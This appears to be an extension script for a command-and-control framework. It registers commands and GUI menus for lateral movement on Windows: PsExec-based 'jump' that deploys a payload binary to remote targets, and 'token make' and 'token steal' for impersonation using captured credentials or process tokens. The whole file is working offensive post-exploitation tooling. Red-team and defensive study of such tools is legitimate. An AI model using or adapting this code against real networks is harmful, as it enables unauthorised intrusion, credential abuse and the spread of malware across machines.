var metadata = {
    name: "LateralMovement",
    description: "BOFs for lateral movement"
};

var _cmd_jump_psexec = ax.create_command("psexec", "Attempt to spawn a session on a remote target via PsExec", "jump psexec 192.168.0.1 /tmp/agent_svc.exe");
_cmd_jump_psexec.addArgString("target", true);
_cmd_jump_psexec.addArgFile("binary", true);
_cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let binary_content = parsed_json["binary"];

    let bof_params = ax.bof_pack("cstr,bytes", [target, binary_content]);
    let bof_path = ax.script_dir() + "_bin/psexec." + ax.arch(id) + ".o";
    let message = `Task: Jimp to ${target} via PsExec`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});
var cmd_jump = ax.create_command("jump", "Attempt to spawn a session on a remote target with the specified method");
cmd_jump.addSubCommands([_cmd_jump_psexec]);


let hook_impersonate = function (task)
{
    let regex = /impersonated successfully:\s+([^\s]+(?:\s[^\s\(\)\[]+)*)(?:\s*\(logon:\s*(\d+)\))?(?:\s*\[(elevated)\])?/i;
    let match = task.text.match(regex);
    if(match) {
        let user = match[1].trim();
        let logonType = match[2] ? parseInt(match[2]) : null;
        let isElevated = match[3] === "elevated";

        if(logonType) { user = user + " (" + logonType + ")"; }

        ax.agent_set_impersonate(task.agent, user, isElevated);
    }
    return task;
}

var _cmd_token_make = ax.create_command("make", "Creates an impersonated token from a given credentials", "token make admin P@ssword domain.local 8");
_cmd_token_make.addArgString("username", true);
_cmd_token_make.addArgString("password", true);
_cmd_token_make.addArgString("domain", true);
_cmd_token_make.addArgInt("type", true, "Logon type: 2 - Interactive\n                                        3 - Network\n                                        4 - Batch\n                                        5 - Service\n                                        8 - NetworkCleartext\n                                        9 - NewCredentials");
_cmd_token_make.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username = parsed_json["username"];
    let password = parsed_json["password"];
    let domain = parsed_json["domain"];
    let type = parsed_json["type"];

    let bof_params = ax.bof_pack("wstr,wstr,wstr,int", [username, password, domain, type]);
    let bof_path = ax.script_dir() + "_bin/token_make." + ax.arch(id) + ".o";
    let message = `Task: make access token for ${domain}\\${username}`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, hook_impersonate);
});

var _cmd_token_steal = ax.create_command("steal", "Steal access token from a process", "token steal 608");
_cmd_token_steal.addArgInt("pid", true);
_cmd_token_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int", [pid]);
    let bof_path = ax.script_dir() + "_bin/token_steal." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: steal access token", hook_impersonate);
});

var cmd_token = ax.create_command("token", "Impersonate token");
cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);


var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_token]);
ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);



/// MENU PROCESS

let token_steal_action = menu.create_action("Steal token", function(process_list) {
    if (process_list.length > 0 ) {
        let proc = process_list[0];
        ax.execute_command(proc.agent_id, "token steal " + proc.pid);
    }
});
menu.add_processbrowser(token_steal_action, ["beacon", "gopher"], ["windows"]);

let token_make_action = menu.create_action("Make token", function(agent_list) {
    if (agent_list.length > 0 ) {

        let map_logon = { "LOGON_INTERACTIVE": 2, "LOGON_NETWORK": 3, "LOGON_BATCH": 4, "LOGON_SERVICE": 5, "LOGON_NETWORK_CLEARTEXT":8, "LOGON_NEW_CREDENTIALS":9 };

        let creds_selector = form.create_selector_credentials(["username", "password", "realm", "tag"]);
        creds_selector.setSize(800, 400);

        let username_label = form.create_label("Username:");
        let username_text  = form.create_textline();
        let select_button  = form.create_button("...");
        let password_label = form.create_label("Password:");
        let password_text  = form.create_textline();
        let realm_label    = form.create_label("Realm:");
        let realm_text     = form.create_textline();
        let logon_label    = form.create_label("Logon type:");
        let logon_combo    = form.create_combo();
        logon_combo.setItems(["LOGON_INTERACTIVE", "LOGON_NETWORK", "LOGON_BATCH", "LOGON_SERVICE", "LOGON_NETWORK_CLEARTEXT", "LOGON_NEW_CREDENTIALS"]);
        logon_combo.setCurrentIndex(5);

        form.connect(select_button, "clicked", function(){
            let cred_list = creds_selector.exec();
            if (cred_list.length > 0) {
                let cred = cred_list[0];
                if(cred["realm"].length == 0) { cred["realm"] = "."; }
                username_text.setText(cred["username"]);
                password_text.setText(cred["password"]);
                realm_text.setText(cred["realm"]);
            }
        });

        let layout = form.create_gridlayout();
        layout.addWidget(username_label, 0, 0, 1, 1);
        layout.addWidget(username_text,  0, 1, 1, 1);
        layout.addWidget(select_button,  0, 2, 1, 1);
        layout.addWidget(password_label, 1, 0, 1, 1);
        layout.addWidget(password_text,  1, 1, 1, 1);
        layout.addWidget(realm_label,    2, 0, 1, 1);
        layout.addWidget(realm_text,     2, 1, 1, 1);
        layout.addWidget(logon_label,    3, 0, 1, 1);
        layout.addWidget(logon_combo,    3, 1, 1, 1);

        let dialog = form.create_dialog("Make token");
        dialog.setSize(440, 200);
        dialog.setLayout(layout);
        dialog.setButtonsText("Make", "Cancel");
        while(dialog.exec()) {
            if(username_text.text().length == 0 || password_text.text().length == 0 || realm_text.text().length == 0) { continue; }

            let command = `token make ${username_text.text()} "${password_text.text()}" ${realm_text.text()} ${map_logon[logon_combo.currentText()]}`;
            agent_list.forEach(id => ax.execute_command(id, command));
            break;
        }
    }
});
menu.add_session_access(token_make_action, ["beacon", "gopher"], ["windows"]);



/// MENU TARGETS

let jump_action = menu.create_action("Jump to ...", function(targets_id) {
    let methods = {
        "PsExec": "jump psexec"
    };

    let agents_selector = form.create_selector_agents(["id", "type", "computer", "username", "process", "pid", "tags"]);
    agents_selector.setSize(1000, 400);

    let label_method = form.create_label("Jump method:");
    let combo_method = form.create_combo();
    combo_method.addItems(["PsExec"]);

    let label_format = form.create_label("Target format:");
    let combo_format = form.create_combo();
    combo_format.addItems(["FQDN", "IP address"]);

    let label_file  = form.create_label("Payload file:");
    let text_file   = form.create_textline();
    let button_file = form.create_button("...");

    let agent_label    = form.create_label("Session:");
    let agent_text     = form.create_textline();
    let select_button  = form.create_button("...");

    let layout = form.create_gridlayout();
    layout.addWidget(label_method,  0, 0, 1, 1);
    layout.addWidget(combo_method,  0, 1, 1, 2);
    layout.addWidget(label_format,  1, 0, 1, 1);
    layout.addWidget(combo_format,  1, 1, 1, 2);
    layout.addWidget(label_file,    2, 0, 1, 1);
    layout.addWidget(text_file,     2, 1, 1, 1);
    layout.addWidget(button_file,   2, 2, 1, 1);
    layout.addWidget(agent_label,   3, 0, 1, 1);
    layout.addWidget(agent_text,    3, 1, 1, 1);
    layout.addWidget(select_button, 3, 2, 1, 1);

    form.connect(select_button, "clicked", function(){
        let agents = agents_selector.exec();
        if (agents.length > 0) {
            let agent = agents[0];
            agent_text.setText(agent["id"]);
        }
    });

    form.connect(button_file, "clicked", function() {
        text_file.setText( ax.prompt_open_file() );
    });

    let dialog = form.create_dialog("Jump to");
    dialog.setSize(400, 180);
    dialog.setLayout(layout);
    dialog.setButtonsText("Execute", "Cancel");
    while ( dialog.exec() == true )  {
        let payload_path = text_file.text();
        if(payload_path.length == 0) { ax.show_message("Error", "Payload not specified"); continue; }

        let payload_content = ax.file_read(payload_path);
        if(payload_content.length == 0) { ax.show_message("Error", `file ${payload_path} not readed`); continue; }

        let format = combo_format.currentText();
        let method = methods[combo_method.currentText()];
        let agent_id = agent_text.text();

        let targets = ax.targets()
        targets_id.forEach((id) => {
            let addr = targets[id].address;
            if(format == "FQDN") { addr = targets[id].computer; }
            if(addr.length == 0 ) {
                ax.show_message("Error", "Target is empty!");
            }
            else {
                let command = `${method} ${addr} ${payload_path}`;
                ax.execute_command(agent_id, command);
            }
        });
        break;
    }
});
menu.add_targets(jump_action, "top");